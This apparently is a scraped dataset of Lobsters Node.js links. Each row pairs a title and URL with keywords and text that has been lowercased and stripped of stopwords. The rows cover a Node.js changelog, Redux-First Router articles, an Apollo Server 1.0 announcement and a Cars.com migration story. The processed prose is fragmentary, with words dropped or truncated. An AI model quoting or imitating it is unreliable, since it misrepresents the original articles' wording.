code rich trott doc use stricter indentation checking doc rich trott doc note fsfutimes work aix gibson fahnestock doc add nodejsdocumentation cc table vse mozhet byt doc doc lifetime napi last error info michael dawson doc add gireeshpunathil collaborator gireesh punathil doc fix mistake pathrelative tobias doc unify errfalsyvaluerejection description tobias doc fixed formatting issue cli doc chris young doc fix link asynchooksmd azard doc add missing zlib link stream api doc rob wu doc fix nit guidesusinginternalerrorsmd vse mozhet byt doc document resconnection ressocket justin beckwith doc fix api doc style daijiro wachi doc update minimum g version ben noordhuis doc util console clarify ambiguous doc natanael log doc test f reserved character xadillax error prevent stack recalculation ruben bridgewater error add missing err prefix utilcallbackify error james snell f two minor optimization ruben bridgewater gyp implement ldldxx ninja fips sam robert http outgoingmessage change writable end roee kasher http guard failed socket creation refael ackermann http always cork outgoing writes brian white semverminor http make opts optional immutable create xadillax inspector perform dns lookup host eugene ostroukhov inspector test fix test bug detected coverity eugene ostroukhov lib update indentation ternary rich trott lib normalize indentation parenthesis rich trott lib remove excess indentation rich trott lib use consistent indentation ternary rich trott lib fix typo ruben bridgewater napi add napifatalerror api kyle farnung napi wrap test macro dowhile kyle farnung napi implement stricter wrapping gabriel schulhof napi fix warning testgeneral daniel bevenius napi add napihasownproperty cjihrig napi fix wmaybeuninitialized compiler warning ben noordhuis napi use maybe version object setprototype ben noordhuis napi add napideleteproperty cjihrig napi add napideleteelement cjihrig napi fix section title typo kyle farnung semverminor net return getconnections sam robert semverminor net return destroy sam robert process improve nexttick performance brian white querystring fix lastpos usage timothy gu readline properly handle character timothy gu repl fix crash large buffer tab completion xadillax src fix memory leak dh key setter ben noordhuis src reduce allocation exportpublickey ben noordhuis src guard double free randombytes ben noordhuis src simplify ben noordhuis src remove release ben noordhuis src avoid heap allocation ben noordhuis src make array arg length compiletime checkable ben noordhuis src refactor ben noordhuis src remove extra heap allocation dh function ben noordhuis src avoid heap allocation hmacdigest ben noordhuis src remove extra heap allocation getsession ben noordhuis src make cipherbase kind const ben noordhuis src remove unused local ben noordhuis src remove superfluous cipher data member ben noordhuis src nt heap allocate gcm cipher auth tag ben noordhuis src avoid heap allocation signfinal ben noordhuis src remove unneeded constcast ben noordhuis src remove extra heap allocation cipherbase ben noordhuis semverminor src whitelist option sam robert src document abortonuncaughtexception sam robert src abortonuncaughtexception nodeoptions sam robert src move cryptobioclienthello crypto n daniel bevenius src add missing new line printed message timothy gu src revise character width calculation timothy gu src f calculate time unsigned long refael ackermann src lib test doc correct misspelling roman reiss stream avoid possible slow path w matteo collina stream improve transform performance brian white test add test http outgoing internal header gergely nemeth test use regex error check testcryptorandom zhang weijie test check error regex testsignalsafety shaman test use regex error check testutilformat superwoods test change style testclibadoptions boydfd test use template literal testwritewrap vercent deng test improve regexps error checking xinglongwangwxl test replace string concatenation template weiyuanyue test use template literal appropriate test use template literal string concat tobewhatwewant test simplify string concatenation jiangplus test use regexp confir error message bang wu test use regluar expression vm test akiraxue test use regular expression match error msg flandre test replace string concat template literal song bintao garfield test check complete error message fraser xu test fix flaky testnetcanresettimeout rich trott test disable multipleenvironmentsperisolate refael ackermann test make commonpipe process unique refael ackermann semverminor test reduce offset testinspectorportcluster cornholio test http outgoing renderheaders peter czibik test decrease duration testclisyntax evan lucas test handle missing test napi test cjihrig test reduce run time testbenchmarkcrypto rich trott test reduce run time testbenchmarkhttp rich trott test reduce testbenchmarknet run duration rich trott test fix flaky testhttpssettimeoutserver rich trott test remove commonnoop rich trott test add getset effective uidgid test evan lucas test fix cctest failure window jimmy thomson test ignore connection error hostname check refael ackermann test check fail inspectorclusterportclash daniel bevenius test add coverage napitypeof michael dawson test restore noop function test rich trott test skip support rich trott test simplify test skipping vse mozhet byt test fix require nit testtls test vse mozhet byt test refactor testhttphostnametypechecking rich trott test refactor testhttp settimeoutserver alexey orlenko test refactor testhttpinvalidheaderfield rich trott test change var const common ruben bridgewater test mark testnpminstall flaky arm refael ackermann test replace indexof includes startswith nataly shrits test refactor testfsoptionsimmutable rich trott test refactor rich trott test remove undef ndebug atexit addons test daniel bevenius test verify napigetproperty walk prototype cjihrig test refactor testfswatchfile rich trott test verify isnativeerror accepts internal error cjihrig test refactor testchildprocesssendtypeerror rich trott test mark flaky real test fix failure testicudatadirjs tobias test refactor testclusterbasic rich trott test refactor testvmsigint rich trott test refactor testtlstwocasonestring rich trott test remove unneeded handlescope usage ezequiel garcia test skip fips test using openssl config file daniel bevenius test refactor testtlsinvokedqueued rich trott test refactor testtlsenvextraca rich trott test make http settimeoutserver similar julien klepatch test check return value eugene ostroukhov test remove require buffer test file xadillax test remove unnecessary require buffer buffer lena test remove require buffer test file zongmin lei test remove require buffer buffer test orilev test remove require buffer f test file test remove unnecessary buffer import steven winston test improve asynchookstestcallbackerror refael ackermann test use string instead regexp split vse mozhet byt test remove needle regexp flag vse mozhet byt test add crypto check testtlswrapeconnreset daniel bevenius test increase utilcallbackify coverage cjihrig test asynchooks match testttywrapreadstream trevor norris test asynchooks skip whether tty available trevor norris test asynchooks stabilize test window refael ackermann test f delay unlink jaime bernardo semverminor tl add host port info econnreset error f romaniello tool update packagejson engine field aj jordan tool increase test timeouts rich trott tool update eslint rich trott tool generate template literal addon test rich trott tool fix error eslintrc comment rich trott tool remove alignmultilineassignment lint rule rich trott tool eslint use error refael ackermann tool update email protected vse mozhet byt tool use nousebeforedefine eslint rule vse mozhet byt tool change var const eslintrules ruben bridgewater tool change var const dochtml ruben bridgewater tool change var const ruben bridgewater tool change var const docpreprocess ruben bridgewater tool change var const docjson ruben bridgewater tool change var const docaddonverify ruben bridgewater tool update eslint rich trott tool remove comment eslint rule daniel bevenius tool disable legacy indentation linting tool rich trott tool add script update eslint rich trott tool update eslint rich trott tool benchmark use stricter indentation linting rich trott url use handlescope toobject bradley farias url normalize port scheme change timothy gu util delete unused argument depth kadoufall util remove redundant declaration vse mozhet byt util add callbackify refael ackermann window installer http window installer http window binary http window binary http macos installer http macos binary http linux binary http linux binary http linux ppc le binary http linux ppc binary http linux binary http aix binary http smartos binary http smartos binary http binary http binary http binary http source code http release file http documentation http begin pgp signed message hash begin pgp signature comment gpgtools http gpgtoolsorg osdr end pgp signature
277,Lobsters,nodejs,Node.js programming,Redux-First Router data-fetching: solving the 80% use case for async Middleware,https://medium.com/faceyspacey/redux-first-router-data-fetching-solving-the-80-use-case-for-async-middleware-14529606c262,reduxfirst router datafetching solving use case async middleware,reduxfirst router datafetching solving use case async middleware use case middleware componentpaired v routepaired data dependency summarized need componentpaired data adhoc fetching componentdidmount unless need unavoidable reason bad reason especially serverrendering bad reason really possible thanks rfr bad reason unavoidable reason routepaired data fetching universal codesplit apps solved problem aside universal split rendering spa problem alone back business derived public portion web application important componentdidmount without apollo derive state middleware great justice declarative imperative remember xml right reason saga observables adhoc thunk closer imperative side aside cookie session state state know upfront render component tree redux contract revelation ui database derived pure function called reducer reducer respond serializable action set state directly indirectly combination action reducer primary bottleneck becomes asynchronicity data fetching multiple dispatch everything avoid action dispatch one another lifecycle method urlmanagement way work le work setup action better focus sole task takeaway see thing url something taken seriously get today rfr prerelease article final comparison old reactrouter reduxthunk way v rfr way conclusion,reduxfirst router datafetching solving use case async middlewareyour routesmap configuration notice thunk optionunderstanding architectural decision behind tool using perhaps important many thing new package youthe reason reach certain skill level journey become aware many way thing expend much time wondering thing best way javascript fatigue aboutthe goal get past point secondguessing become confident path chosen execute quickly efficientlybut mean listen gut instinct sometimes know deep even though using fanciest say async middleware tried still correct way way truly stop secondguessing thing best way unhelpful sound signal inside stop know selected correct strategy juncture journey uncommon occurrence persistent developer luxury always pursue itthe use case middlewaretoday going explain reduxfirst router datafetching strategy sound powerful strategy use case term app may well needthe usecase async middleware dispatching action sequence synchronous setup action asynchronous followup action start want plant concept mind frame reference primary datafetching strategy react within component componentpaired data dependency triggered route routepaired data dependency async middleware fall second category without urlized unless using reduxfirst routernote apollo graphql specializes former category purpose article debunk effective route recommend apollo larger apps reduxfirst router work great apollo perfectly fact use le reduxfirst router datafetching capability reduxfirst router v apollo thing apollo capability serve another useful frame reference throughout articlewhat though adhoc componentdidmount fetching thing v rfr routepaired data fetching thing tackle problem componentdidmount getting current middleware strategy complex miss mark use casecomponentpaired v routepaired data dependenciespairing data component make whole lot sense system like apollo handle nuance particularly promise resolution server without muchthere hype train around pairing even nongraphql data component via componentdidmountin majority case data paired route ie url parameter url get handle route unveil later article reason routepaired data deps preferable easier testing component need datafetching mocked serverside rendering becomes dream fetch data based url params prepopulate redux store call rendertostring perf better server render component tree twice resolving promise like apollo marshaling data server client matter assigning window rehydratingyou avoid latency nested component fetching additional data already able fetch data need based routeyou circumvent fact redux reactredux reliably dispatch within componentdidmount serveryou write custom errorprone stuff call componentdidmount component likely renderedthose thing want thing make life far easier summarized setup state urlthen render statewhen need componentpaired data really need componentpaired data question must ask make best decision herewell let talk apollo second reason mention relay apollo work redux since uistate important want something made redux story mind however say apollo really mean apollo relay similarnot apps need graphql apollo fact believe hype graphql rest killer even though big supporter graphql apollo simply recommend latter greenfield apps inevitably become large perhaps prototyping phase appso get apollo get data close proximity preshaped shape prop component receive colocated get avoid friction around manually fetch data componentdidmountafter initial setup far le thinking regarding sending data serveryou get caught remaking adhoc fetchingsending scheme oneoff endpoint incrementally add take away intuitive mindset developmentyou basically distilling otherwise neverending boilerplate creation process purest definition need need great power make bulleted pro routepaired data deps worth going withoutthat time would recommend fetching data way paired route ie get extra perk fantastic featurecomplete library bring full circle go apollo adhoc fetching componentdidmountnow rest u gotten attached fetching data componentdidmount using apollo wrong unless need change primary api endpoint serve data create new endpoint helpfulrequired guarantee component new feature data depend huge company many developer working big apps ahem facebook problem reason relay created apps fall category token trap added complexity feature fact need unavoidable reason component render several different route want change multiple route insure get need easier read feeling lazy write custom logic component level even mean additional fetch bad reason especially serverrendering component derived ui state corresponding url solving one reduxfirst router action excuse urlized action bad reason really possible thanks rfr come concoction prop cascading component tree generate parameter exist view layer aka component tree problem likely something wrong need get better use redux somehow dug hole month development going back bad reason unavoidable reason moving state view layer designated location redux state aka fat model moving datafetching designated location route aka thin controller timehonored tradition mvc refine process keep popping worksfetching data componentdidmount modern incarnation fat viewscontrollers antipatternthe problem good designated place controller nowso bottom line reason either bad reason unavoidable reason control former example soon come help latter case feel suspect large organization serious apps old apis maybe time make push apollographql overhauli propose solution everyone goal first help see difference routepaired v componentpaired data dependency see perhaps could done via url alongroutepaired data fetchingto able accomplish routepaired data fetching ask one question information need url cooky keep mind request header apply ajax request control header sent user visit website directly point important ever universal codesplit apps solved problemthe day single page apps solely making ajax request overaside universal split rendering spayou making app spa power user losing customer google time till interactive tti slower bounce higher percentage visitor compound google problem since google like fast site etcin general server rendering app simultaneously code splitting losing userscustomersmoney reason ever make tradeoff one development cost trying high guess spent like month problem alone back businessok let get back business url cooky cooky mean user let distill url parameter via path query knowledge user visiting site thing itso question since diligent developer refuse blind spot missing reality greenfield apps control url using missing anything put every bit state otherwise would exist component tree redux store url every bit critical state everything else derived story overyou want former truly primary reason componentpaired data bad apollo service server recursively resolving promise attached componentscalling await somecomponentprototypecomponentdidmount await somecomponentfetchdata making determination component call professional opinion basically end custom system exists app general abstraction serf newcomer looking code far better reduxfirst router abstraction way skip componentdidmount thing altogether moving thing closer url leaf pure component le coupling view layerkeep mind problem primarily exists serverside nature handling request server synchronous regardless whether use asyncawait request handled sequentially fulfilling todo liston client live breathing app responding user inputsevents child component within tree respond individually truly asynchronous case componentpaired data fetching nice impedance match go apollo server want respond incoming request quickly possible must way make use state initially supplied url sequentialsynchronous thing play outrendering twice virtual dom one time precious cycle one day wish conserved result multiple nonparallel request data even worse nobody saying use apollo use place hightrafficked public portion sitebottom line apollo lends nice workflow one want get carried away come serverrendering longer response time great private area web app seo matter react native say public portion web application important get userscustomers distill datafetching server one database request literally making money redux finally routing framework put thing right place even bettercomponentdidmount without apolloas componentdidmount without apollo various reason people gravitated toward data fetching componentdidmountthe primary one likely redux control using redux async middleware wrap might even category user hell bent fetching data stateful componentsit may also matter habit habit started introduced redux appthat say componentdidmount workflow time useful one even advanced redux developer sometimes want get component working want fetch data right without visiting boilerplate want use component multiple place sure datadependencies ssr radar easy see componentdidmount viable optionfor personally ssr always radar rfr available almost year fetching data componentdidmount never something considerthe workflow thing important let discount rfr also nice workflow u urlized action extremely intuitive pair data dependency action form thunk nice convergence typical redux pattern terminology derive state middleware going assume understandagreewith importance url hopeful refine critical url state application redux stateso assuming understand plan prepopulate redux store render option available best populate store parse url manually fetch data api server dispatch action returned datadispatch action function reduxthunk middleware grab state already combine url state fetch data dispatch resultssagas take action based url basically reduxthunk synchronous feelobservables thing excel dealing lot fast event stream basically stuff option option asynchronous middleware use option parse url initially dispatch best asynchronous middleware debate today answer still use reduxfirst router recommendation use shine thoughbut want opinion asyncawait solves saga targeted save observables true steam datainputs occasional tapsclicks fetchingrelated debouncingeven though reduxfirst router includes middleware important think something simpler thatwhat solution common dispatch synchronous setup action followup action dispatched ticksmillisecondsseconds later data asynchronouslyin word vast majority time simply want set initial state set second state depending data fetching job wentsagas observables give tremendous power go far beyond allowing listen complexmultiple input dispatch however many followup async action need change fact time one upfront one usecase usecase redux middleware dispatching action sequence synchronous setup action asynchronous followup actionif dispatching action thing might well wrong seen lot apps start leaning towards needing action batching middleware etc really need expand variety action reducer respond toso since rfr work beautifully saga etc recently added one thing made saga experience even better way nice stupid simple idiomatic solution evercommon backtoback dispatch yes answer pair followup action triggersetup action idiomatic way perhaps config object namely route reduxfirst router one dispatch thunk aka followup action route rfr basically action way apply context action core context action corresponds precise url also thing prefetching chunk advanced prefetching data advanced talking remainder article important thing well basis prefetching fetching data via route thunk optioneach route config object thunk option look like thunk function dispatch reduxthunk one exception within thunk need dispatch initial setup action know one set state show spinnerthe reason need waste energy dispatching setup action within thunk route setup action url visited corresponding action path params extracted payload dispatchednote first time looking reduxfirst router type dispatched visit example listjavascript list complete action look like type list payload category javascript linkingnavigation operates way react router via link navlink component server simply pas rfr request path get thing going covering server rendering depth future articleso reiterate thanks urlized context skip manually dispatching setup action small win benefit urlcentric config unfolds win mount upgreat justice declarative imperative distill solution config object rather adhoc code achieve great justicetruth came game like many era mvc framework rage convention configuration still know mean seems overlap quite bit tell could configure entire app one big json blob one happy programmeryou remember xml right tool used configuration well html xml sub superset whatever react specifically chose jsx route declarative coding half way imperative coding configuration jsx essentially configuration backdoor write adhoc imperative code need toit depends definition imperative mean write plain procedural javascript otherwise pure declarative component functionsso reason saga observables adhoc thunk closer declarativetoimperative spectrum imperative side able define thunk route configuration give meaning thunk lock therefore closer configurationdeclarative sideso premise route thunk meaningful url context know exactly data dependency supposed go place closest url state state minus user session cookie synchronously render fromfancy middleware rfr share another key conceptbenefit specifying data dependency away place dispatch request centralized hopefully single placeaside cookie session stateas cookie session state fall category category state know upfront render component treethe strategy call createstore server side initial state second argument containing user object retrieved using session cookie json web token also form cookie article tackle auth user session cookie point boat url state check mind similarly call clientside graphql cache simply apollo continue call state url even though includes user session cookie url state critical url state contract revelationto make sure page let talk contract redux core contract revelation contract ui database derived pure function called reducersyour reducer respond serializable action set state directly indirectly combination action reducersthat contract gain give predictable state subsequently predictable view renderingthese gain extend far provide sequence action guaranteed resulting statewith foundation opportunity timetraveling debugging unveils well everything see redux devtools live build redux apps probably use far far react devtoolsi use later working people code use cheattool figure code much since usually component rendered current component tree prop head state time reduxi remember day used debug chrome time redux devtools basically displaced good job building app pure function pure component pure reducer pure everythingif thing redux devtools answer common question well dispatch correct action reducer responding action correctly subsequently since debugging easy since pure component also damn easy deal primary bottleneck becomes asynchronicity data fetching multiple dispatcheswhere rfr really shine midst asynchronous data fetching challenge also deal url make sure action dispatched route matching beginning initially setup app every often add new feature make url afterthought afterthought cause problem rearchitect app certainly something requires additional dispatchessee part problem developer end dispatching many action example apps everything avoid action synchronously dispatch one another consider incorrect time tempted dispatch consecutive synchronous action instead figure make reducer respond correctly one action dispatchedyour reducer able fully respond first action reason batching middleware time antipatternso thing setup dispatch one action display one thing another action display something else yet another subsequent action function call change url definitely wrong something like reduxfirst router service instead littering lifecycle method throughout component tree adhoc componentlevel dispatchesin word componentlevel dispatch cause multiple synchronous dispatch ultimately crummy rendering performance disorganized redux architectureto clear always exception rule today talking ruleurlmanagement wayso problem way ie urlmanagement keeping everything sync relieved lot pressure complexity async data fetchingdatafetching boil user reaching url work requesting data le work setup action making decision dispatching single followup action better focus sole task followup action may one many possible action example user visit mysweetappcomentity slug dispatch followup action retrieves various related entity based slug like displayor user visit mysweetappcomme without loggedin redirect back login form user loggedin asynchronously fetch data need display within dashboard quick answer trigger loading spinner entitiesfetched dispatched longer worry dispatching initial setup action virtue visiting type dispatched reducer know display spinner data cachedas see rfr offer redirect action creator one utility offered library goal keep api surface minimum work onetime setup routesmap continued work via typical redux pattern eg within reducer connecting component etc another thing worth looking route notfound addressed dispatching notfound type exported rfr solution throw hand know exactly render get data needed case video given categoryyou simply dispatch notfound depending whether rfr infer url display correct url even though data notfoundpath supplied option connectroutesfrom reducer determine display receives notfound type usually would also note internally system dispatch notfound route matchedwhy bring dispatching notfound like redirects part idiomatic way use route thunkstakeawaythe takeaway longer file full adhoc action creator thunk know path took left read comment remember everything work see thing url something taken seriously force encode app logical way possible much needed structure contract keep action app deal minimumwhen see thunk corresponds url say login path know thunk handle url know exactly expect thunk know thunk deal ityou inevitably struggle manage exponentially growing number action creator treat setter urlized action prevents creating action need result reducer become fatter smarterwhereas might looked like look like former often end dispatching sidebaropen right another action something else least easily fall trapconversely reduxfirst router reducer become pagecentric responsible tear response bunch action might responded pasthow get todaythe fact matter redux took u direction anything everything became possible since user likely trigger sort event became nice way able deal anything come wayso flexibility react router tricking u thinking right way dealing url state within view layer forgot old wisdom mvcin mvc term react v redux rfr cif like thought mvc pattern deadbottom line new powerful tool made possibility possible rfr give u much structure world desperately need become child desperate need structureas initial rfr prerelease article case getting lost along way new thing opened pandora box optionsin rfr prerelease article describe everything component strategy essentially workaround clientside database like redux synced url statein article debunked fancy middleware workaround proper routing mechanism corresponding contextual structure ie routesmap clear rfr middleware middleware enhancer reducer set action creator link component route component middleware probably biggest part middleware like others rather give infinite flexibility constrains via contract like dan abramov promoted redux owed true powerutility torfr first router framework provide defined place request data response path query params seasoned developer anything new everything old new rfr first solution take mvc heart apply reduxspecific context period mvc anathema everyoneat end day using routing thing bulk time complicated super flexible middleware even people manage come discrepancy edge case covering somewhere case thunk attached urlized actionsfinal comparisonto wrap thing let final comparison old way new reduxfirst router wayif made far deserve break play song review code comparison follows ie real meat article old componentdidmount reactrouter reduxthunk way v rfr way old componentdidmount waytake note way reactrouter state contained within view layer ownpropsmatchparamscategory combined redux state derive final state well dispatch current future action via requestvideos within componentdidmount componentwillreceivepropsnew reduxfirst router waythe primary thing notice new way besides half size requestvideos thunk moved permanent place value route thunk case standard redux thunk receive dispatch getstate argument however using reduxfirst router longer need dispatch initial requestvideos action list action intrinsically used insteadalso keep mind since thunk tied route easily add switch component need videosbycategory state remove original one without worrying whether necessary data available nice colocate data component many reason decoupled data improvement workflowthe next thing notice category retrieved redux state rather ownpropsmatchparamscategory exists view layerthe last perhaps important thing observe new way us stateless component old way requires componentdidmount componentwillreceiveprops truly get job done looking rfr routecentric approach barely make sense update store component anymore unless onclicketc reduxfirst router automates recall thunk user navigates category category ie url url come serverrendering rfr really shine longer need discover component data dependency router resolve thunk prepopulate store one render tackle ssr rfr depth future articleas video share primary reducer storing video category however loading reducer slightly differentold loading reducernotice rfr loading reducer responds innate list type never dispatch matchparamscategory moved view layer simple reducer new loading reducer category reduceraside contextual application thunk important improvement actually simplicity receiving type payload corresponding route see screenshot directly abovethe list type remember keyname one route basically reference url visited random type whose awkward name settled pageto give perspective quote reactrouterredux readme read location state directly redux store react router operates asynchronously handle thing dynamicallyloaded component component tree may yet updated sync redux state rely prop passed react router updated processed asynchronous code short using react router stuck state view layer already know think whereas reduxfirst router deal url state like state natural way might say way supposed beconclusionreduxfirst router give thunk context based url reduces number action creator need selfdocumenting purposerfr brings focus core datafetching work followup action removing need perform urlhistoryrelated chore performing setup dispatch yourfr force write better fatter smarter reducersrfr eliminates state view layer trap well aforementioned problem react router syncing reduxrfr configuration contract put break exploding usage middleware thunk providing familiar yet reduxspecific interface lends thin controller rfr nevertheless work existing middleware apollorfr make serverrendering firstclass priority bite butt come time address codesplitting equally straightforwardreduxfirst router us redux terminology idiom excellent impedance match reduxif tinkered yet right routesmapjs file focus today analysis
278,Lobsters,nodejs,Node.js programming,Apollo Server 1.0 — A GraphQL Server for all Node.js frameworks,https://dev-blog.apollodata.com/apollo-server-1-0-a-graphql-server-for-all-node-js-frameworks-2b37d3342f7c,apollo server graphql server nodejs framework,apollo server apollo optic free apps try optic apollo server principle graphqljs community community simplicity performance zero commits contributor almost per day get started build graphql server graphqltools doc readme huge thank everyone contributed hagai cohen nick nance stubailo neoreyad hribb nicolaslopezj urigo dotansimha conradvanl spicydonuts timneutkens creatorkuang tallyb kamilkisiela kievechua rdrey neophi trotzig jadkap rafaelcosman papandreou claudiuceia phra nevir benjamn pradel xeoneux dahjelle siegesmund sammkj pcarrier dattaya larsw alexleung alanchristensen ephemer thebigredgeek comus blakeembrey omegablitz go apollo slack github,today year development testing production use proud announce release apollo server late edit also announced apollo optic free apps million query per month try optic visualize monitor track graphql api apollo server principle apollo server communitymaintained opensource graphql server work nodejs http server framework express connect hapi koa aws lambda restify micro built top graphqljs reference implementation apollo server built following principle mind community community apollo server development driven need developerssimplicity keeping thing simple apollo server easier use easier contribute secureperformance apollo server welltested productionready modification needed principle laid project started happy see principle still hold today zero development apollo server driven community beginning really exciting watch little year went zero commits contributor npm downloads grown almost per day npm downloads apollo server among production user couple name might recognize one know sure many others using apollo server production company mentioned let u know comment using apollo server yet want give try read next section learn set get started want indepth introduction set graphql server connect sql mongo rest backends highly recommend recently updated tutorial build graphql server far viewed post blog note used apollo server previously may notice import apolloserver rather graphqlserver npm package felt rename better reflects part apollo project family library easy use apollo server built graphql schema example graphqltools import express express import bodyparser bodyparser import graphqlexpress graphiqlexpress strong apolloserverexpress strong const mygraphqlschema define import schema const port const app express bodyparser needed post request appuse graphql bodyparserjson strong graphqlexpress strong schema mygraphqlschema graphiql reachable http appuse graphiql strong graphiqlexpress strong endpointurl graphql applisten port example us express almost integration check doc readme set apollo server hapi koa lambda restify micro huge thank everyone contributed release apollo server would never possible without hard work contributor two people whose contribution really stand hagai cohen nick nance nick laid foundation became apollo server built hapi micro integration project may never gotten started thank nick hagai came bit later turned apollo server today migrated project lerna refactored large part codebase project chief maintainer month without apollo server nearly good today thank hagai many contributor course last year whose big small contribution made difference thank stubailo neoreyad hribb nicolaslopezj urigo dotansimha conradvanl spicydonuts timneutkens creatorkuang tallyb kamilkisiela kievechua rdrey neophi trotzig jadkap rafaelcosman papandreou claudiuceia phra nevir benjamn pradel xeoneux dahjelle siegesmund sammkj pcarrier dattaya larsw alexleung alanchristensen ephemer thebigredgeek comus blakeembrey omegablitz go apollo server community project idea find bug shy filing issue opening pull request github always looking contributor maintainer think could something let u know contributor channel apollo slack directly github liked post want hear apollo graphql make sure click follow button follow u twitter apollographql helferjs
279,Lobsters,nodejs,Node.js programming,How one senior developer at Cars.com convinced the entire company to do a full migration to Node.js,https://modernweb.com/cars-com-nodejs/,one senior developer carscom convinced entire company full migration nodejs,carscom problem keeping javascript java sync unique cm challenge one saying hey let node mac built proof concept time mac leadership reacted proof concept full node migration benefit node carscom thing mac said taking initiative,look like developer go beyond company think probably look lot like mac hellerogden two year ago working late evening carscom completing proof concept started initiative mac senior developer time trying answer question could nodejs improve workflow efficiency performance carscom principal developer kind enough spend minute u skype recently tell u story article learn build proof concept nodejs carscom also learn long took leadership carscom said saw work spoiler loved happened next note software project nodejs framework need help introduce experienced development team help build contact u mac hellerogden presenting jfrog user conference problem keeping javascript java sync like many large wellestablished site carscom historically relied java serverside architecture last year however carscom begun using lot applike behavior site evolution created increase clientside javascript work often change made javascript clientside change also needed java serverside keep thing working worked process mac others found timeconsuming inefficient lot aligning serverside part front end clientside mac told u two totally different world nodejs bridge gap server client side website importantly using node serverside mean easier frontend developer understand possibly even help backend code surface looked like node might able solve inefficiency carscom least mac thought idea worth testing unique cm challenge behind scene carscom unique content management system cm configuration cm serverside java coupled together creating unique coding challenge development team developer writing serverside code forced write jsps javaserver page within cm mac others wanted break link content management content rendering also wanted move away jsps developed considered many antiquated method writing serverside code hope breaking link content management serverside code would speed development time improve performance jsps cm bundled together noise source code command merge conflict mac said creates clunky developer workflow stuff together one saying hey let node development team carscom talking way improve workflow several year looked node possible solution including play option favored another developer team happens many organization team busy continued using workflow knew well using year nobody saying hey let node mac told u felt something might able help u created test mac built proof concept time mac thought asking bos time explore proof concept nodejs decided approach time good answer question knew face node want go discussion knew viable would work told u mac thought node obvious solution several team chronic problem technical challenge know could overcome instead campaigning work hour mac worked time staying late several week see could build working proof concept exercise much anything told u wanted see could make work saw test page working test environment knew time take node senior leadership mac leadership reacted meeting leader carscom development team mac presented proof concept proposed adopting nodejs across entire carscom site nervous meeting hoping idea proof concept would met positive response need worried saw mac proposal proof concept mac leadership team immediately receptive showed could done quickly could done benefit saw told u nervous gave thumb said let make happen proof concept full node migration mac tasked lead project assigned several developer help promised boss first page published using node within two week initial meeting stupidest answer ever given mac told u laugh thinking infrastructure process security everything else needed get working took mac team month get everything place challenge anticipated one point reached help bringing node consultancy perspective expertise talented folk mac said really helped u validate approach six month initial meeting mac team began successfully launching nodebuilt section website two year ago writing two small section carscom migrated node currently progress close completed benefit node carscom difficult say would happened without mac initial proof concept probably carscom would still muddling along working manually keep javascript java sync migrating node instead company seen benefit numerous area speed performance gain end largest benefit internal number javascript developer learned node working daytoday basis much le need manually sync java javascript past serverside coupling java cm broken relieving team problem used fight old configuration addition past carscom team released new site every month two node several workflow release many dozen small update day node wellsuited cicd continuous integration continuous delivery mac said new release schedule node made number change improve thing node big part thing mac said taking initiative toward end conversation mac said something thought profound mac decision pursue node time took courage company would frown upon kind initiative fortunately carscom one node fantastic framework think help many company similar situation carscom perhaps mac story much node mac developer working company kind positive impact want maybe wait exploring big idea sitting maybe go build time need whether formal permission asked mac risk took taking action initiative actually done something like several time career said success every time note software project nodejs framework need help introduce experienced development team help build contact u nathan writing professionally decade extensive experience creating content online also former journalist
280,Lobsters,nodejs,Node.js programming,Redux-First Router lookin Sexy on Code Sandbox,https://medium.com/faceyspacey/redux-first-router-lookin-sexy-on-code-sandbox-d9d9bea15053,reduxfirst router lookin sexy code sandbox,reduxfirst router lookin sexy code sandbox flaunt lot first reduxfirst note feel free go straight code sandbox power user know tool target action kickass playground homepage back good thing tinker sandbox eric clemmons trickledown hashing great justice componentsswitcherjs transition group reactuniversalcomponent aside transitiongroup one next universalcomponent universal component beat webpackflushchunks justice next redirects srcoptionsjs disclaimer rfr general c mvc react v redux c thunklevel redirects reducer respond rfr location reducer respond therefore component easily respond general actiontoreducer stuff rfr prerelease article thing brings u end liked photo hope fun sandbox today adventure really lead water tasty water taste like craft beer rather belgian beer favorite ives van hoorne ba buursma got ta scroll top idiomatic javascript reactlandia read,reduxfirst router lookin sexy code sandboxthis article could accurately titled use reduxfirst router code sandbox hey something sexy word bruno mar flaunt itfirst nothing response reduxfirst router overwhelmingly supposed quote genius berkeleytrue cto freecodecamp finished ripping reactrouter using far good vignesh venkataraman since read anything well written routing land really exciting idea want try port rcnio restutafrom first major pull request happy contribute blog post formidable guy wrote really resonated router thanks super responsive always make pr much fun iansinnott first time seen redux make sense eric clemmons first want say fantastic work libs react ssr code splitting deepdeep dive last several day get something correctly started came across stuff today godsend eudaimos first great work thanks making happy everything redux bmoquistlots first reduxfirst note feel free go straight code sandbox power user know tool target actionyou know say brag show rfr code sandbox sexy combination let get business thing ive ba kickass playground startoh yea start right sexy mediumembeddable widget code sandbox embeddable code widget sexy photo folksyou also go directly homepage ives one code sandbox creator supportive enough movement put rfr directly homepage worked directly several issue get functioning flawlessly accommodating super fast superstar making sleep think already know good thing tinker sandbox datafetching srcroutesmapjsthere builtin devtools serious redux get get datafetching rfrsee thunk key valuable option route topic thing tinker first time looking probably read acclaimed intro article hey people said reduxfirst router summary action type home list video key route routesmap dispatch action always equivalent push action useful like previous reduxspecific router duhlet keep movingso routesmap like every mvc ever existedeverything old new againand action routespath parameter extracted payload objectthe thunk thing dispatch reduxthunk middlewareno new conceptsjust far context since attached route seeing initial route action dispatched use trigger spinner etc paired followup asynchronous action moment later dispatch data case dispatch array video categoryin future article going go detail datafetching overall idea finally write redux apps worry url providing simplest solution use case fact url table leaf lot breathing room primary task datafetchingthat subject think article montagepreview inside rfr code sandboxapps dont got ta think url way supposed exactly eric clemmonsdata fetching complete read code look picture artistic day tell ability steal codesandbox color trickledown hashing great justice componentsswitcherjswtf trickledown hashing new professional term keying object multiple consecutive place architecture display need key saving writing imperative liner figure later datewhat mean look next screenshoti claim advanced science claim puzzle piece long missing avoid actual work multiple level succumbed automagic solution great short term rather multiple solution correctly invert control flow star align framework turn major headache resolve million workarounds achieve custom need essentially configurationdriven middleware backing frameworkless approach recommend power user hitting many level one probably wan na look want check switcher component srccomponentsswitcherjs well reducer power reducerspagejs one page reducer able extract page url via action typeset dedicated state named reducerthen really come together declaratively tell react transition groupbased component page currently visible getting sexy transition thing reactuniversalcomponent nested within code split fetch necessary componentasideif never used react transition group honestly missing extremely underrated underused tool opinion recall article describing people hate think one thing people felt fancy enough never truly groked truth concept right problematic vision never completed made called transitiongrouptg applies cs give callback let apply global prop transition child let customize individual child highly useful feature like debouncewhat say people dynamic animation using cs best frame rate transitiongroup great topic another time big deal point none solution aremy solution simplest tobeexpected interface previously possible various implementation hurdle none u time work interface stuff stupid simple let fool though thinking complicated enough one true way 